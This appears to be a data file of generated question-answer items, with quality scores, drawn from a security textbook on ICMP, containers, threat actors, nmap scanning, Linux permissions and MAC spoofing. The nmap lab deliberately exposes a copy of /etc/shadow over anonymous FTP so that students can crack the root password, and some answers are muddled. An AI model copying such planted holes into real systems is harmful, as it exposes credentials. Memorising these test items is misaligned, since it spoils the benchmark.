{"context": "### 4.2.2. ICMP {#_computer_systems_security_planning_for_success.xhtml__icmp}\nInternet Control Message Protocol (ICMP) is largely used to send messages between systems when IP doesn't work. For\n\nexample, lets say we tried to connect to a host but our router doesn't know how to get there. Our router can send us an\n\nICMP *Destination Unreachable* message to let us know that something is going wrong. Because ICMP messages work at the\n\nnetwork layer, we will receive this message even if there is an issue with the internet layer.\n\nThe most common use for ICMP is the `ping`{.literal} command. `ping`{.literal} sends an ICMP echo request to check to\n\nsee if a host is up. By responding to the request with the data included in the request we can assume that the host is\n\nup and functioning.\n\nICMP is also used in the `traceroute`{.literal} command. `traceroute`{.literal} incrementally increase the Time To Live\n\n(TTL) field of ICMP packets and watches for *TTL Exceeded* messages to determine what route packets are taking to get to\n\na host. Example `traceroute`{.literal} output is shown below:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets\n\n 1  ryan.njitdm.campus.njit.edu (172.24.80.1)  0.217 ms  0.200 ms  0.252 ms\n\n 2  ROOter.lan (192.168.2.1)  5.790 ms  5.765 ms  6.275 ms\n\n 3  * * * \u2460\n\n 4  B4307.NWRKNJ-LCR-21.verizon-gni.net (130.81.27.166)  19.166 ms  19.144 ms  21.097 ms\n\n 5  * * * \u2460\n\n 6  0.ae1.GW7.EWR6.ALTER.NET (140.222.2.227)  12.376 ms  14.634 ms 0.ae2.GW7.EWR6.ALTER.NET (140.222.2.229)  9.805 ms\n\n 7  209.85.149.208 (209.85.149.208)  9.782 ms  10.331 ms  9.192 ms\n\n 8  * * * \u2460\n\n 9  dns.google (8.8.8.8)  11.313 ms  9.761 ms  9.758 ms</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice these routers not responding to ICMP packets\n\n:::\n\nDespite the usefulness of ICMP, ICMP packets from external sources are often ignored. Network engineers use ICMP to\n\ntroubleshoot their own networks, but it would be a security issue to allow outside parties to do the same. As such, do\n\nnot expect all external hosts to respond to pings. They may still be up, but you'll need to figure out [another way to\n\ndetect them.](https://nmap.org/book/man-host-discovery.html){.link}\n\n::::\n\n::: {.section .sect3 title=\"4.2.3. NAT\"}\n", "topic": "ICMP's operation at the network layer and its dependence on IP functionality.", "question": "In the context of network communication, what fundamental dependency does ICMP have on IP, and how does this relationship contribute to its diagnostic utility?", "answer": "ICMP\u2019s reliance on IP allows it to function even when the internet layer is experiencing issues.", "explanation": "ICMP relies on the Internet Protocol (IP) to function because it operates at the network layer. This means ICMP messages are transmitted using IP packets, allowing them to traverse the network even if there are issues with the internet layer. This dependency enables ICMP to report network-level problems like unreachable hosts.", "question_token_count": 28, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 20, "choices": null}
{"context": "### 10.1.2. Containers {#_computer_systems_security_planning_for_success.xhtml__containers}\nA container simplifies the VM by using the same operating system kernel as the host. This is accomplished by using\n\nspecial features of the Linux kernel to isolate the container. [Linux\n\nnamespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html){.link} controlled by\n\n[cgroups](https://man7.org/linux/man-pages/man7/cgroups.7.html){.link} allow a daemon (Docker, podman, etc.) to make an\n\nenvironment where the application has limited access to the full system. Typically containers are used to run a single\n\napplication as if it were running all by itself on an actual host. This makes it easier to deploy the unique\n\nenvironments that some applications require.\n\nThe obvious security concern lies in the isolation. What happens if a container has access to another containers\n\nresources? Given that containers for rival companies may be running next to each other on the same machine in the cloud,\n\nwhat are the risks of having a malicious container access or disrupt another?\n\n:::\n\n::: {.section .sect3 title=\"10.1.3. Container Orchestration Systems\"}\n", "topic": "How does the use of containers simplify application deployment compared to traditional virtual machines, and what are the trade-offs involved?", "question": "Considering the described isolation mechanisms (namespaces and cgroups) within containers, what inherent vulnerability arises from the potential for a compromised container to access and manipulate the resources of adjacent containers, and how does this challenge the fundamental premise of container security?", "answer": "Shared resource access vulnerability.", "explanation": "The answer correctly identifies the vulnerability stemming from shared resources and the potential for a malicious container to disrupt others. This directly addresses the security concern raised in the text.", "question_token_count": 49, "answer_correctness_score": 8, "explanation_validity_score": 8, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 6, "choices": null}
{"context": "## 1.4. Threat Actors {#_computer_systems_security_planning_for_success.xhtml__threat_actors}\n<figure class=\"image right\">\n\n<div class=\"content\">\n\n<img src=\"images/anonymous.svg\" width=\"200\" alt=\"anonymous\" />\n\n</div>\n\n<figcaption><a href=\"https://pixabay.com/illustrations/anonymous-revolution-guy-fawkes-1235169/\" class=\"link\">Anonymous\n\nRevolution Guy Fawkes</a> is used under <a href=\"https://pixabay.com/service/license/\" class=\"link\">Pixabay\n\nLicense</a></figcaption>\n\n</figure>\n\nTo better be able to manage the risks of a data breach, it helps to be able to identify/understand the attacker or\n\nthreat actor involved. Just as there are many reasons an actor may attempt to gain unauthorized access there are also\n\nmany groups of threat actors.\n\nNeophytes making use of automated tools that they may not fully understand are often referred to a *script kiddies*. You\n\nmay hear other pejorative names as well such as lamer, noob, or luser, but the common thread is that these threat actors\n\nare *not* highly sophisticated. The same techniques used for automating defensive security can also be applied to\n\nautomating attacks. Unfortunately this means that you may encounter actors \\\"punching above their weight\\\" or using\n\ncomplex tools while having only a rudimentary understanding of what they do.\n\nHacktivist are threat actors that attack to further social or political ends. These groups can be very sophisticated.\n\nThe most well known hacktivist group is *Anonymous* which has been linked to several politically motivated attacks.\n\nOrganized crime is another element which may employ or support threat actors typically to make money. These groups\n\ntypically have access to more resources and contacts than a solo actor. It is important to note that threat actors with\n\nroots in organized crime may find it easier to migrate into other areas of crime due to their proximity to a large\n\ncriminal enterprise. For example, while it may be difficult for a script kiddie to broker the sale of valuable data, a\n\nhacker working with an organized crime syndicate may have people close to them that are familiar with the sale of stolen\n\ngoods.\n\nThe last group of threat actors, and arguably the group with the most resources, are threat actors working with or for\n\ngovernments and nation states. These groups may have the explicit or implicit permission of their country to commit\n\ncyber crimes targeting other nations. Given the constant threat and resources available to these groups, they are\n\nreferred to as an advanced persistent threat (APT). By utilizing the resources of a nation (often including its\n\nintelligence and military resources) APTs are a severe threat.\n\n:::\n\n::::: {.section .sect2 title=\"1.5. Security Plans\"}\n", "topic": "The importance of identifying threat actors in data breach risk management strategies.", "question": "Considering the varying levels of sophistication and resources exhibited by script kiddies, hacktivists, organized crime groups, and advanced persistent threats (APTs), what fundamental strategic adjustment would a security planning team prioritize to effectively mitigate risks associated with the most technically proficient threat actors?", "answer": "A layered defense strategy incorporating advanced threat detection and response capabilities.", "explanation": "The question requires synthesis of the text's description of different threat actor types and asks for a strategic response, pushing beyond simple recall.", "question_token_count": 56, "answer_correctness_score": 9, "explanation_validity_score": 8, "question_clarity_score": 8, "question_groundedness_score": 8, "avg_answer_token_count": 13, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Understanding the impact of network vulnerabilities on system security.", "question": "Based on the provided context, identify three potential vulnerabilities present on the \u2018victim\u2019 machine and explain how each could be exploited.", "answer": "Insecure FTP configuration, default ProFTPD installation, and lack of robust OS security measures.", "explanation": "The \u2018victim\u2019 machine exhibits vulnerabilities including an insecure FTP configuration (allowing anonymous login), a default ProFTPD installation, and a lack of robust OS security measures (revealed through nmap\u2019s OS detection). Exploitation could involve unauthorized file transfer via FTP, potential password compromise through default credentials, and leveraging OS weaknesses.", "question_token_count": 27, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 20, "choices": null}
{"context": "### 7.3.11. Tokenization {#_computer_systems_security_planning_for_success.xhtml__tokenization}\nTokenization may be used as part of an access control scheme to protect sensitive information. Information that would be\n\nhighly valuable if compromised is replaced with a random token known to the parties involved in the transaction. In a\n\ntypically scenario once the tokens have been established, only the token is sent out over an untrusted network.\n\nImagine you don't want your credit card number exposed to merchants. One solution would be if you used a payment service\n\nthat issued you a new credit card number for each transaction. This credit card number would only be valid for a single\n\ntransaction and would be billed to your regular credit card (which the payment service would have access to). In this\n\ncase the token is the one-time-use credit card number and the sensitive information is your actual credit card number.\n\nPayment services like ApplePay and GoogleWallet do exactly this.\n\n:::\n\n:::::::::::::::::\n\n::::::: {.section .sect2 title=\"7.4. Lab: Linux File Permissions\"}\n\n\n## 7.4. Lab: Linux File Permissions {#_computer_systems_security_planning_for_success.xhtml__lab_linux_file_permissions}\nIn this lab we are going to explore UNIX style file permissions and determine what they can do and why they are limited.\n\nFinally we will see how Linux ACLs provide more flexibility in assigning permissions.\n\nWe will be working in a vanilla Ubuntu container and installing software and adding users manually. Let's start up the\n\ncontainer, install the packages we need, and add some users to work with:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>C:\\Users\\rxt1077\\it230\\docs&gt;docker run -it ubuntu bash\n\nroot@11ce9e5ee80e:/# apt-get update\n\n&lt;snip&gt;\n\nroot@11ce9e5ee80e:/# apt-get install acl\n\nReading package lists... Done\n\nBuilding dependency tree\n\nReading state information... Done\n\nThe following NEW packages will be installed:\n\n  acl\n\n0 upgraded, 1 newly installed, 0 to remove and 4 not upgraded.\n\nNeed to get 37.8 kB of archives.\n\nAfter this operation, 197 kB of additional disk space will be used.\n\nGet:1 http://archive.ubuntu.com/ubuntu focal/main amd64 acl amd64 2.2.53-6 [37.8 kB]\n\nFetched 37.8 kB in 0s (94.1 kB/s)\n\ndebconf: delaying package configuration, since apt-utils is not installed\n\nSelecting previously unselected package acl.\n\n(Reading database ... 4127 files and directories currently installed.)\n\nPreparing to unpack .../acl_2.2.53-6_amd64.deb ...\n\nUnpacking acl (2.2.53-6) ...\n\nSetting up acl (2.2.53-6) ...\n\nroot@11ce9e5ee80e:/# useradd alice\n\nroot@11ce9e5ee80e:/# useradd bob\n\nroot@11ce9e5ee80e:/# useradd carol\n\nroot@11ce9e5ee80e:/# useradd dave</code></pre>\n\n</figure>\n\nTraditional UNIX file permissions support user and group ownership of a file. Read, write, and execute permissions for a\n\nfile can be set for the user, group, or others. You can view the permissions of a file with the `ls -l`{.literal}\n\ncommand. Let's make home directories for Alice, Bob, and Carol and view the default permissions:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/# cd home\n\nroot@11ce9e5ee80e:/home# mkdir alice bob carol\n\nroot@11ce9e5ee80e:/home# ls -l\n\ntotal 12\n\ndrwxr-xr-x 2 root root 4096 Oct 28 01:28 alice\n\ndrwxr-xr-x 2 root root 4096 Oct 28 01:28 bob\n\ndrwxr-xr-x 2 root root 4096 Oct 28 01:28 carol</code></pre>\n\n</figure>\n\nThe text `drwxr-xr-x`{.literal} tells us that these files are directories, the owner has read/write/execute permission,\n\nthe group has read/execute permission, and other users have read/execute permission. It is important to note that\n\nexecute permissions are required for viewing the contents of a directory.\n\nFiles owners and a groups are set with the `chown`{.literal} command, following the format\n\n`chown <user>.<group> <filename>`{.literal}. Let's try to use this command to make the home directories of alice, bob,\n\nand carol private:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# chown alice.alice alice\n\nroot@11ce9e5ee80e:/home# chown bob.bob bob\n\nroot@11ce9e5ee80e:/home# chown carol.carol carol\n\nroot@11ce9e5ee80e:/home# ls -l\n\ntotal 12\n\ndrwxr-xr-x 2 alice alice 4096 Oct 28 01:28 alice\n\ndrwxr-xr-x 2 bob   bob   4096 Oct 28 01:28 bob\n\ndrwxr-xr-x 2 carol carol 4096 Oct 28 01:28 carol</code></pre>\n\n</figure>\n\nWhen a user is added to a UNIX system with the `useradd`{.literal} command a group with their name is created. This\n\nallows us to pass a group to `chown`{.literal} that only they will have access to. While this is a good start, others\n\nstill have the ability to read and execute these directories, meaning *anyone* can view the contents. To prove this,\n\nlets assume the role of dave and try doing an `ls`{.literal} on each of the directories:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# su dave \u2460\n\n$ ls alice\n\n$ ls bob\n\n$ ls carol\n\n$ exit</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* `su`{.literal} allows us to assume the role of anyone, often it is used to assume the role of the *superuser*\n\n:::\n\nThe `ls`{.literal} command was successful even though there were no files to look at. If we weren't able to view the\n\ncontents, we would have received a permission denied error. The `chmod`{.literal} command is used to modify file\n\npermissions for a User (`u`{.literal}), Group (`g`{.literal}), Others (`o`{.literal}), or All (`a`{.literal}).\n\n`chmod`{.literal} can remove a permission with `-`{.literal}, add a permission with `+`{.literal}, or set a permission\n\n(removing others) with `=`{.literal}. Let's use `chmod`{.literal} to actually make these home directories private:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# chmod u=rwx,g=,o= alice\n\nroot@11ce9e5ee80e:/home# chmod u=rwx,g=,o= bob\n\nroot@11ce9e5ee80e:/home# chmod u=rwx,g=,o= carol\n\nroot@11ce9e5ee80e:/home# ls -l\n\ntotal 12\n\ndrwx------ 2 alice alice 4096 Oct 28 01:28 alice\n\ndrwx------ 2 bob   bob   4096 Oct 28 01:28 bob\n\ndrwx------ 2 carol carol 4096 Oct 28 01:28 carol</code></pre>\n\n</figure>\n\nThings look much better, but let's test it and see if Dave can view any of the directories:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# su dave\n\n$ ls alice\n\nls: cannot open directory &#39;alice&#39;: Permission denied\n\n$ ls bob\n\nls: cannot open directory &#39;bob&#39;: Permission denied\n\n$ ls carol\n\nls: cannot open directory &#39;carol&#39;: Permission denied\n\n$ exit</code></pre>\n\n</figure>\n\nLastly, lets make sure that Alice can view the contents of her home directory:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# su alice\n\n$ ls alice\n\n$ exit</code></pre>\n\n</figure>\n\nLooks good!\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nUsing your first name (all lowercase) add yourself as a user and create a home directory for yourself. Set the\n\npermissions such that only you can view the contents. Show the permissions of the home directory and demonstrate that\n\nanother user *cannot* view its contents. Take a screenshot showing all of this and submit this as one of your\n\ndeliverables.\n\n:::\n\n</aside>\n\nUnfortunately traditional UNIX file permissions often do not provide the granularity needed in a modern system. For\n\nexample, lets assume that we wanted a web server to be able to view the contents of Alice, Bob, and Carol's home\n\ndirectories. This is typically done to allow users to place a `public_html`{.literal} directory in their home directory\n\nand set up a personal web space. We could do this by making their home directories viewable by others, but then we have\n\nthe same issue we started with. We could also do this by changing the group ownership of their home directories to a\n\ngroup that the web server is part of, but then we open up the home directories to any other users or services that are\n\npart of that group.\n\nThe solution to this problem is to use Linux ACLs, which allow you to fine tune permissions. Two commands,\n\n`setfacl`{.literal} and `getfacl`{.literal} are used to adjust Linux ACLs. As an example let's add an http user, use the\n\n`setfacl`{.literal} command to explicitly give the http user read and execute permissions to all three directories, list\n\nthe new permissions, and list the new ACLs:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# useradd http\n\nroot@11ce9e5ee80e:/home# setfacl -m u:http:rx alice bob carol\n\nroot@11ce9e5ee80e:/home# ls -l\n\ntotal 12\n\ndrwxr-x---+ 2 alice alice 4096 Oct 28 01:28 alice \u2460\n\ndrwxr-x---+ 2 bob   bob   4096 Oct 28 01:28 bob\n\ndrwxr-x---+ 2 carol carol 4096 Oct 28 01:28 carol\n\nroot@11ce9e5ee80e:/home# getfacl alice bob carol\n", "topic": "The `chmod` command modifies file permissions, allowing control over read, write, and execute access for the owner, group, and others.", "question": "Considering the initial permissions granted to Alice, Bob, and Carol\u2019s home directories using `chown`, and the subsequent use of `chmod` to restrict access, explain why Dave, assuming the role of a different user, was still able to list the contents of their directories, highlighting the limitations of traditional UNIX file permissions.", "answer": "Dave could list the directories because the \u2018others\u2019 permission was not restricted, allowing access regardless of user identity.", "explanation": "The initial `chown` commands only altered the owner and group of the directories, leaving the \u201cothers\u201d permissions unchanged.  Therefore, any user, including Dave, could still access the directories because they were granted read and execute permissions to them.", "question_token_count": 65, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 23, "choices": null}
{"context": "## 5.2. Network Layer Attacks {#_computer_systems_security_planning_for_success.xhtml__network_layer_attacks}\n::: {.section .sect3 title=\"5.2.1. MAC Spoofing/MAC Cloning\"}\n\n\n### 5.2.1. MAC Spoofing/MAC Cloning {#_computer_systems_security_planning_for_success.xhtml__mac_spoofingmac_cloning}\nMost networks expect that a MAC address will correspond to the unique numbers on a network interface controller (NIC),\n\nbut it is actually quite easy to change. Virtual networking necessitates the ability to use a different MAC address and\n\nthis feature is built into most modern operating systems. MAC spoofing is when an attacker sets their MAC address to the\n\nMAC address of another machine on the network in an effort to initiate an attack. For example, them may set themselves\n\nup as a gateway to launch a MitM attack.\n\n:::\n\n::: {.section .sect3 title=\"5.2.2. MAC Flooding\"}\n\n\n### 5.2.2. MAC Flooding {#_computer_systems_security_planning_for_success.xhtml__mac_flooding}\nSwitches are tasked with keeping track of which MAC addresses correspond to which ports on the switch. They use this to\n\nmake sure that traffic is only routed where it needs to go. Given that MAC addresses can be changed, an attacker could\n\nflood a switch with packets from many different MAC addresses and possibly overflow the MAC-port routing table. Some\n\nswitches may default to hub-like functionality and send frames to all ports in an effort to keep traffic flowing. This\n\nthen allows an attacker to capture traffic from other machines on the network.\n\n:::\n\n:::: {.section .sect3 title=\"5.2.3. ARP Poisoning\"}\n", "topic": "MAC spoofing involves changing a device's MAC address to impersonate another device on the network, enabling attacks like Man-in-the-Middle (MitM) attacks.", "question": "How does MAC spoofing specifically contribute to the potential for a Man-in-the-Middle (MitM) attack, as described in the text?", "answer": "Mimicking another device\u2019s MAC address.", "explanation": "The 